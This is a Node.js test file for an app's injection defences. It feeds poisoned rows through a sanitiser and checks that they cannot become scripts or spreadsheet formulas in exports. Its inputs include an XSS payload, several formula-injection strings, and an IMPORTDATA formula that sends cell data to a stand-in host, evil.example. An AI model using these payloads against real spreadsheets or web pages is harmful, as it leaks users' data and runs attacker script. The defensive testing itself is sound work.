#!/usr/bin/env node
/* Crafted rows (from a compromised low-privilege account or the public order form) must not become scripts or spreadsheet formulas (audit 19.10):
 * typed fields are normalised on the way in, objects in text fields are dropped, CSV cells that start like a formula get an apostrophe — and REAL data passes through unchanged.
 *   node tests/inject-check.js
 */
const fs = require('fs');
const os = require('os');
const path = require('path');
const { loadApp } = require('../api/_loadApp');
const html = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
const app = loadApp(html);
let fails = 0;
const expect = (c, m) => { if (!c) { fails++; console.error('❌ ' + m); } };
const X = '"><img src=x onerror=alert(1)>';
const F = { f: 'IMPORTDATA("https://evil.example/?"&A1)', v: '' };

// 1. poisoned rows
const rows = app.safeRows([
  { id: 'a1', type: X, stage: X, status: X, whoseCustomer: X, date: X, paidDate: X, promiseDate: X, materials: X, total: F, hours: [1], paidAmount: {}, partnerAmount: NaN, payment: F, work: F, address: F, phone: F, customer: F, notes: F, partnerName: F, category: F, deadline: F, deadlineTime: X, kind: X },
  { id: 'a2', type: 'income', stage: 'paid', date: '2026-10-01', paidDate: '', promiseDate: '2026-10-09', materials: 50, total: '350', hours: 1.5, deadlineTime: '11:30', work: 'סתימה', payment: 'מזומן' }
]);
const p = rows[0];
const ISO = /^(\d{4}-\d{2}-\d{2})?$/;
expect(ISO.test(p.date) && ISO.test(p.paidDate) && ISO.test(p.promiseDate) && ISO.test(p.deadline), 'dates normalised');
expect(['materials', 'total', 'hours', 'paidAmount', 'partnerAmount'].every(k => typeof p[k] === 'number' && isFinite(p[k])), 'numbers normalised: ' + JSON.stringify([p.materials, p.total, p.hours, p.paidAmount, p.partnerAmount]));
expect(p.type === 'income' && !('stage' in p) && !('status' in p) && !('whoseCustomer' in p) && !('kind' in p), 'enums: bad type → income, bad others dropped');
expect(['payment', 'work', 'address', 'phone', 'customer', 'notes', 'partnerName', 'category'].every(k => p[k] === ''), 'objects in text fields dropped');
expect(p.deadlineTime === '', 'time normalised');
const g = rows[1];
expect(g.total === '350' && g.hours === 1.5 && g.deadlineTime === '11:30' && g.work === 'סתימה' && g.paidDate === '' && g.promiseDate === '2026-10-09', 'a good row is untouched');

// 2. the poisoned row cannot reach a spreadsheet as a formula
app.state.tx = rows; app.state.tasks = []; app.state.customerMeta = {}; app.state.priceList = []; app.state.settlements = [];
let leaked = false;
try {
  for (const sh of app.buildExportSheets()) {
    const grid = sh.rows && sh.rows.length ? app._sheetRowsToGrid(sh.rows, sh.formulaCols) : [];
    for (const row of grid) for (const c of row) if (typeof c === 'string' && /IMPORTDATA|evil\.example/.test(c)) leaked = true;
  }
} catch (e) { expect(false, 'export must not crash on a poisoned row: ' + e.message); }
expect(!leaked, 'a crafted object became a formula in the export');

// 3. CSV: formula-looking text is neutralised, numbers and ordinary text are not
const c = app.csvSafeText;
expect(c('=WEBSERVICE("x")') === "'=WEBSERVICE(\"x\")" && c('@SUM(A1)') === "'@SUM(A1)" && c('+1+1') === "'+1+1" && c('-cmd') === "'-cmd" && c('\tx') === "'\tx", 'formula starts get an apostrophe');
expect(c('-350') === '-350' && c(350) === 350 && c('דוד') === 'דוד' && c('') === '' && c(null) === '', 'numbers / names / empty untouched');

// 4. REAL data passes through unchanged
const dir = path.join(os.homedir(), 'Downloads');
const files = fs.existsSync(dir) ? fs.readdirSync(dir).filter(f => /^יהודה-גיבוי-.*\.json$/.test(f)).sort() : [];
if (files.length) {
  const d = JSON.parse(fs.readFileSync(path.join(dir, files[files.length - 1]), 'utf8'));
  for (const k of ['tx', 'tasks', 'products', 'priceList']) {
    const before = JSON.stringify(d[k] || []), after = JSON.stringify(app.safeRows(JSON.parse(before)));
    expect(before === after, 'real ' + k + ' must pass the row filter unchanged');
  }
}
// 5. the server-side sync path uses the same filter
expect(/app\.state\.tx = app\.safeRows\(d\.tx\)/.test(fs.readFileSync(path.join(__dirname, '..', 'api', '_syncCore.js'), 'utf8')), 'api/_syncCore.js must filter rows read from Firestore');
if (fails) { console.error('inject-check: ' + fails + ' failures'); process.exit(1); }
console.log('✅ inject-check: שורות עם ערכים זדוניים לא הופכות לקוד או לנוסחאות; נתונים אמיתיים עוברים בלי שינוי');
